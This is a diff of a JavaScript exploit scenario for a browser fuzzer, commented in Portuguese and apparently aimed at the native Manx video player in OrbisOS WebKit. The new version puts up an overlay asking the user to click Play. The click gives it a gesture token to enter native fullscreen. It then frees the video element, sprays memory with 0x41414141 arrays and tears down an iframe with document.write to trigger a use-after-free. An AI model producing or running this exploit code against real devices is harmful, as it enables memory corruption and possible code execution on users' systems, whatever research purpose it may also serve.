@@ -1,28 +1,42 @@
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Blueprint)
- * Alvo: FullscreenVideoController + FrameLoader Teardown
+ * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Sniper Trigger)
+ * Alvo: MediaPlayerPrivateManx + User Gesture Token
  */
 
 export default {
     id:       'VIDEO_FULLSCREEN_REMOVE',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Usa a entrada Fullscreen padrão (automática no fuzzer) combinada com ' +
-                 'o teardown letal de 500ms via document.write para forçar o UAF no C++.',
+    description: 'Pausa o fuzzer e cria um vídeo real na tela. ' +
+                 'Aguarda o clique do utilizador (Play) para obter o Token de Gesto e ' +
+                 'forçar a entrada no Manx Nativo de forma 100% fiável.',
 
     setup: async function() {
-        // O Iframe invisível para conter a explosão do document.write
-        this.iframe = document.createElement('iframe');
-        this.iframe.setAttribute('allowfullscreen', 'true');
-        this.iframe.style.opacity = '0.01';
-        document.body.appendChild(this.iframe);
+        // 1. Criamos um "Overlay" visual para forçar a interação manual
+        this.overlay = document.createElement('div');
+        this.overlay.style.cssText = `
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.9); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        `;
+        
+        const title = document.createElement('h1');
+        title.innerText = "🔥 CLIQUE NO PLAY PARA INJETAR 🔥";
+        title.style.color = "#0fa";
+        this.overlay.appendChild(title);
 
-        const doc = this.iframe.contentDocument;
-        this.video = doc.createElement('video');
+        // 2. O vídeo isca que você sugeriu
+        this.video = document.createElement('video');
         this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
-        doc.body.appendChild(this.video);
+        this.video.controls = true;
+        this.video.style.border = '4px solid #0fa';
+        this.video.style.width = '600px';
+        this.video.style.cursor = 'pointer';
+        
+        this.overlay.appendChild(this.video);
+        document.body.appendChild(this.overlay);
 
-        // O nosso payload de Spray (0x41414141)
+        // O nosso payload de memória (0x41414141)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -36,45 +50,71 @@ export default {
     },
 
     trigger: async function() {
-        try {
-            // 1. ENTRADA (A que funcionava): API DOM padrão.
-            // O fuzzer consegue disparar isto automaticamente sem bloquear a tela.
-            if (this.video.webkitRequestFullscreen) {
-                this.video.webkitRequestFullscreen();
-            }
-
-            // 2. A SUA TÁTICA: 500ms de espera.
-            // O tempo exato para o OrbisOS alocar as superfícies gráficas.
-            await new Promise(r => setTimeout(r, 500));
-
-            // 3. FREE: Apagamos o vídeo da memória do DOM
-            this.video.remove();
-
-            // 4. SPRAY: Inundamos o buraco com ponteiros falsos
-            this.spray = [];
-            for (let i = 0; i < 5000; i++) {
-                let arr = new Uint32Array(256);
-                arr.set(this.sprayPayload);
-                this.spray.push(arr);
-            }
-
-            // 5. USE (A SAÍDA): Acionamos o controlador C++ para tentar 
-            // modificar o vídeo que acabámos de apagar e substituir.
-            if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            }
-
-            // 6. O GATILHO FATAL: Destruição do contexto.
-            // O document.write aniquila o FrameLoader enquanto o C++ 
-            // ainda tenta processar a saída do Fullscreen.
-            setTimeout(() => {
+        // O GATILHO SNIPER: Retornamos uma Promise que paralisa o fuzzer
+        // até que o utilizador clique no vídeo.
+        return new Promise((resolve) => {
+            
+            const unleashExploit = async () => {
                 try {
-                    this.iframe.contentDocument.write('PWNED');
-                    this.iframe.contentDocument.close();
-                } catch(e) {}
-            }, 100);
+                    // Oculta o overlay visualmente para não atrapalhar
+                    this.overlay.style.display = 'none';
 
-        } catch(e) {}
+                    // 1. O SEGREDO DO 12.00: Chama o reprodutor nativo (Manx)
+                    // Com o Token de Gesto garantido pelo clique, isto NUNCA falha.
+                    if (this.video.webkitEnterFullscreen) {
+                        this.video.webkitEnterFullscreen();
+                    } else if (this.video.webkitRequestFullscreen) {
+                        this.video.webkitRequestFullscreen();
+                    }
+
+                    // 2. A Pausa de Ouro (500ms para alocar a GPU)
+                    await new Promise(r => setTimeout(r, 500));
+
+                    // 3. FREE: Puxamos o tapete
+                    this.video.remove();
+
+                    // 4. SPRAY: Injetamos o veneno
+                    this.spray = [];
+                    for (let i = 0; i < 5000; i++) {
+                        let arr = new Uint32Array(256);
+                        arr.set(this.sprayPayload);
+                        this.spray.push(arr);
+                    }
+
+                    // 5. USE: Forçamos a saída nativa
+                    if (this.video.webkitExitFullscreen) {
+                        this.video.webkitExitFullscreen();
+                    } else if (document.webkitExitFullscreen) {
+                        document.webkitExitFullscreen();
+                    }
+
+                    // 6. TEARDOWN: Destruição do ambiente nativo
+                    // Criamos um iframe descartável apenas para causar o choque de document.write
+                    let trashIframe = document.createElement('iframe');
+                    document.body.appendChild(trashIframe);
+                    
+                    setTimeout(() => {
+                        try {
+                            trashIframe.contentDocument.write('BOOM');
+                            trashIframe.contentDocument.close();
+                            trashIframe.remove();
+                        } catch(e) {}
+                        
+                        // Libera o fuzzer para continuar para a fase de Probe
+                        resolve(); 
+                    }, 100);
+
+                } catch(e) {
+                    resolve(); // Libera em caso de erro
+                }
+            };
+
+            // Escuta o evento de 'play' (quando clica no vídeo)
+            this.video.addEventListener('play', (e) => {
+                e.preventDefault();
+                unleashExploit();
+            }, { once: true });
+        });
     },
 
     probe: [
@@ -84,7 +124,7 @@ export default {
     ],
 
     cleanup: function() {
-        try { this.iframe.remove(); } catch(e) {}
+        try { this.overlay.remove(); } catch(e) {}
         this.spray = null;
         this.video = null;
     }
